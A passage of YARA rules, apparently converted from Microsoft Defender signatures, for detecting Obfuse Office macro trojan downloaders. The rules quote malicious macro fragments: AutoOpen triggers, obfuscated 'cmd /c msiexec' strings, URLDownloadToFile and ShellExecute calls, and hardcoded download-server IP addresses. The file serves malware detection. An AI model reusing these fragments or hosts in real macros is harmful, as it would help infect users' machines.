        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-20] 2e 43 6f 6e 74 72 6f 6c 73 28 31 29 2e 54 65 78 74 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 52 75 6e 21 20 22 22 20 2b 20 [0-20] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = ".Controls(2).Value) +" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GV_2147741176_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GV"
        threat_id = "2147741176"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-20] 2e 43 6f 6e 74 72 6f 6c 73 28 31 29 2e 54 65 78 74 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".Controls(0).Text" ascii //weight: 1
        $x_1_4 = ".Controls(0).Value" ascii //weight: 1
        $x_1_5 = {2e 52 75 6e 21 20 [0-22] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GW_2147741239_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GW"
        threat_id = "2147741239"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 70 6c 69 74 28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 [0-22] 29 2e 52 61 6e 67 65 28 [0-7] 29 2e 56 61 6c 75 65 2c 20 43 68 72 28 34 34 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 20 [0-54] 28 30 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_1_3 = ": Call" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GX_2147741259_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GX"
        threat_id = "2147741259"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-20] 28 31 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = ".Controls(0).Value" ascii //weight: 1
        $x_1_4 = {2e 43 6f 6e 74 72 6f 6c 73 28 [0-5] 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 52 75 6e 21 20 28 [0-32] 29 20 2b 20 22 22 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GY_2147741304_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GY"
        threat_id = "2147741304"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 65 74 20 [0-5] 20 3d 20 [0-6] 2e 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 52 69 67 68 74 28 [0-8] 2c 20 4c 65 6e 28 [0-8] 29 20 2d 20 31 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Chr(92) & Rnd & \".jse\"" ascii //weight: 1
        $x_1_4 = "Set WshScript = objOL.CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_5 = "WshScript.ShellExecute" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GZ_2147741310_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GZ"
        threat_id = "2147741310"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {22 6e 65 77 3a 22 20 2b 20 [0-20] 28 31 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 4a 6f 69 6e 28 41 72 72 61 79 28 [0-20] 28 32 29 2c 20 22 22 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 52 75 6e 21 20 [0-18] 2c 20 30 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HA_2147741348_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HA"
        threat_id = "2147741348"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= GetObject(\"new:\" +" ascii //weight: 1
        $x_1_2 = "+ vbNullString = vbNullString Then" ascii //weight: 1
        $x_1_3 = {2e 52 75 6e 21 20 [0-20] 2c 20 30 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HB_2147741359_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HB"
        threat_id = "2147741359"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "If InStr(ActiveDocument.Paragraphs(j).Range.Text, \"Error\") Then" ascii //weight: 1
        $x_1_2 = "If InStr(ActiveDocument.Paragraphs(j).Range.Text, \"view this\") Then" ascii //weight: 1
        $x_1_3 = "Declare PtrSafe Function SendMessage Lib \"Ace32\" Alias _" ascii //weight: 1
        $x_1_4 = "(Environ(\"TEMP\"))" ascii //weight: 1
        $x_1_5 = "= \"verinstere.xls\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HC_2147741408_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HC"
        threat_id = "2147741408"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "MsgBox \"vdfghefdgfg\"" ascii //weight: 1
        $x_1_2 = "= Environ(\"temp\") & \"\\MicrosoftOfficeWord.exe\"" ascii //weight: 1
        $x_1_3 = "getUrl3 = \"http://54.39.144.250/\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HD_2147741409_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HD"
        threat_id = "2147741409"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"WSCript.sHELl\"" ascii //weight: 1
        $x_1_2 = "= \"Cmd /C msIe^x^eC \" & Chr(443 - 396) & Chr(503 - 398) & Chr(167 - 135) & Chr(260 - 156) & Chr(208 - 92) & Chr(473 - 357) & Chr(492 - 380) & Chr(102 - 44) & Chr(309 - 262) &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HE_2147741414_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HE"
        threat_id = "2147741414"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {56 42 41 2e 47 65 74 4f 62 6a 65 63 74 28 [0-36] 2e 54 65 78 74 29 2e 52 75 6e 21 20 [0-22] 2c 20 30 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_3 = ".Controls" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HF_2147741426_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HF"
        threat_id = "2147741426"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "MsgBox \"vdfghefdgfg\"" ascii //weight: 1
        $x_1_2 = "MsgBox \"dfg3dsfdsf\"" ascii //weight: 1
        $x_1_3 = "getUrl3 = \"http://51.75.133.165/\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HG_2147741432_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HG"
        threat_id = "2147741432"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {47 65 74 4f 62 6a 65 63 74 28 [0-37] 20 2d 20 [0-3] 29 2e 54 65 78 74 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 52 75 6e 21 20 [0-20] 2c 20 30 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = ".Controls" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HH_2147741448_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HH"
        threat_id = "2147741448"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 42 79 4e 61 6d 65 20 43 6c 61 73 73 37 2e 56 61 6c 61 61 72 31 2c 20 22 73 61 76 65 74 22 20 26 20 22 6f 66 69 6c 65 22 2c 20 56 62 4d 65 74 68 6f 64 2c 20 [0-8] 2e 65 22 20 26 20 22 22 20 2b 20 22 78 65 22 2c 20 32}  //weight: 1, accuracy: Low
        $x_1_2 = "ExecuteExcel4Macro \"MESSAGE(False, \"\"Fix Marv\"\")\"" ascii //weight: 1
        $x_1_3 = "Rocky1.Open Me.Label3.Caption, Me.T10_Text.Tag, False" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HI_2147741476_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HI"
        threat_id = "2147741476"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "fU2 = \"http://54.39.233.134\"" ascii //weight: 1
        $x_1_2 = "fU2 = \"http://54.39.233.132/de1.trp\"" ascii //weight: 1
        $x_1_3 = "Call Shell(fP1" ascii //weight: 1
        $x_1_4 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 2c 20 66 55 31 2c 20 66 50 31 [0-5] 2c 20 30 2c 20 30 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HJ_2147741486_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HJ"
        threat_id = "2147741486"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {22 43 72 65 61 74 65 22 2c 20 56 62 4d 65 74 68 6f 64 2c 20 [0-56] 28 30 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {53 70 6c 69 74 28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 [0-20] 29 2e 52 61 6e 67 65 28 [0-7] 29 2e 56 61 6c 75 65 2c 20 43 68 72 28 34 34 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-56] 28 31 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HK_2147741525_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HK"
        threat_id = "2147741525"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "#If True And 1 And 1 And 1 And 1 And 1 _" ascii //weight: 1
        $x_1_2 = "And 1 And 1 And 1 And 1 And 1 And 1 And 1 Then" ascii //weight: 1
        $x_1_3 = {50 72 69 76 61 74 65 20 44 65 63 6c 61 72 65 20 [0-8] 46 75 6e 63 74 69 6f 6e 20 74 69 6d 65 47 65 74 54 69 6d 65 [0-5] 20 4c 69 62 20 22 77 69 6e 6d 6d 2e 64 6c 6c 22 20 28 29 20 41 73 20 4c 6f 6e 67}  //weight: 1, accuracy: Low
        $x_1_4 = {50 72 69 76 61 74 65 20 44 65 63 6c 61 72 65 20 46 75 6e 63 74 69 6f 6e 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 57 20 4c 69 62 20 22 75 72 6c 6d 6f 6e 22 20 28 42 79 56 61 6c 20 78 34 a6 53 5a 43}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HM_2147741585_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HM!MTB"
        threat_id = "2147741585"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 77 77 2e 6d 69 6e 70 69 63 2e 64 65 2f 6b 2f 62 63 31 6c 2f 31 36 70 74 75 73 2f 24 00 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "Sub Document_Open()" ascii //weight: 1
        $x_1_3 = {57 69 6e 64 6f 77 73 5c 53 79 73 74 65 6d 33 32 5c 6d 73 68 74 61 2e 65 78 65 24 00 53 68 65 6c 6c 20 22 43 3a 5c}  //weight: 1, accuracy: Low
        $x_1_4 = "End Sub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HM_2147741585_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HM!MTB"
        threat_id = "2147741585"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {56 62 4d 65 74 68 6f 64 2c 20 [0-52] 28 30 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 52 75 6e 28 22 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-53] 22 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 [0-20] 29 2e 56 61 6c 75 65 29 3a 20 43 61 6c 6c}  //weight: 1, accuracy: Low
        $x_1_3 = {53 70 6c 69 74 28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 [0-22] 29 2e 52 61 6e 67 65 28 [0-7] 29 2e 56 61 6c 75 65 2c 20 22 2c 22 29 3a 20 43 61 6c 6c}  //weight: 1, accuracy: Low
        $x_1_4 = {53 70 6c 69 74 28 [0-55] 2c 20 22 2c 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 53 70 6c 69 74 28 [0-54] 2c 20 22 7c 22 29}  //weight: 1, accuracy: Low
        $x_1_6 = {54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 [0-20] 29 2e 52 61 6e 67 65 28 [0-7] 29 2e 56 61 6c 75 65 29 3a 20 43 61 6c 6c}  //weight: 1, accuracy: Low
        $x_1_7 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 [0-23] 29 2e 56 61 6c 75 65 29 3a 20 43 61 6c 6c}  //weight: 1, accuracy: Low
        $x_1_8 = {47 65 74 4f 62 6a 65 63 74 28 [0-53] 28 31 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HL_2147741588_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HL!MTB"
        threat_id = "2147741588"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {47 65 74 4f 62 6a 65 63 74 28 54 72 69 6d 28 [0-64] 20 2d 20 [0-3] 29 2e 56 61 6c 75 65 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 4c 54 72 69 6d 28 [0-21] 28 [0-21] 29 2e 56 61 6c 75 65 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-20] 2e 56 61 6c 75 65 20 26 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 56 42 41 2e 47 65 74 4f 62 6a 65 63 74 28 [0-20] 20 2b 20 22 22 20 2b 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 52 75 6e 21 20 [0-20] 2c 20 30 20 2b}  //weight: 1, accuracy: Low
        $x_1_6 = ".Controls" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HO_2147741606_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HO!MTB"
        threat_id = "2147741606"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "save2file = peopepepepe & Chr(92) & Rnd & \".jse\"" ascii //weight: 1
        $x_1_2 = "Set shellObj = objOL.CreateObject(\"Shell.Application\", \"\")" ascii //weight: 1
        $x_1_3 = "shellObj.ShellExecute save2file" ascii //weight: 1
        $x_1_4 = ".CreateTextFile(save2file, True, True)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HP_2147741607_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HP!MTB"
        threat_id = "2147741607"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"WSCRipt.sHELl\"" ascii //weight: 1
        $x_1_2 = "= \"cmD /c msIE^X^Ec \" & Chr(245 - 198) & Chr(150 - 45) & Chr(182 - 150) & Chr(335 - 231) & Chr(467 - 351) & Chr(161 - 45) & Chr(267 - 155) & Chr(273 - 215) & Chr(55 - 8) & Chr(194 - 147) & Chr(415 - 365) & Chr(399 - 348) &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HQ_2147741620_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HQ!MTB"
        threat_id = "2147741620"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {53 65 74 20 [0-18] 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {29 2e 52 75 6e 21 20 [0-20] 2c 20 32 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = ".Controls" ascii //weight: 1
        $x_1_5 = ".Value" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HR_2147741644_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HR!MTB"
        threat_id = "2147741644"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_2 = {31 39 35 2e 31 32 33 2e 32 34 31 2e 31 34 34 2f 61 70 69 2e 70 68 70 1e 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = "C:\\Vertis\\Kots\\svchost" ascii //weight: 1
        $x_1_4 = "ShellExecuteA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HR_2147741644_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HR!MTB"
        threat_id = "2147741644"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = {2e 56 61 6c 75 65 29 2e 52 75 6e 25 20 [0-48] 28 32 29 20 2b 20 [0-48] 28 30 29 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 52 75 6e 25 20 [0-32] 28 [0-20] 2e 43 6f 6e 74 72 6f 6c 73 2c 20 32 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = ".Controls" ascii //weight: 1
        $x_1_5 = "= Sqr(4) - 1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HS_2147741660_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HS!MTB"
        threat_id = "2147741660"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {56 62 4d 65 74 68 6f 64 2c 20 [0-52] 28 30 29 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 [0-20] 29 2e 56 61 6c 75 65 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 [0-32] 29 2e 52 61 6e 67 65 28 [0-7] 29 2e 56 61 6c 75 65 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 70 6c 69 74 28 [0-52] 2c 20 22 7c 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {47 65 74 4f 62 6a 65 63 74 28 [0-52] 28 31 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HT_2147741681_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HT!MTB"
        threat_id = "2147741681"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"WSCript.sHELl\"" ascii //weight: 1
        $x_1_2 = "= \"CMD /c Msie^X^Ec \" & Chr(189 - 142) & Chr(405 - 300) & Chr(85 - 53) & Chr(341 - 237) & Chr(281 - 165) & Chr(198 - 82) & Chr(421 - 309) & Chr(233 - 175) & Chr(403 - 356) &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_HU_2147741738_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.HU!MTB"
        threat_id = "2147741738"
        type = "TrojanDownloader"
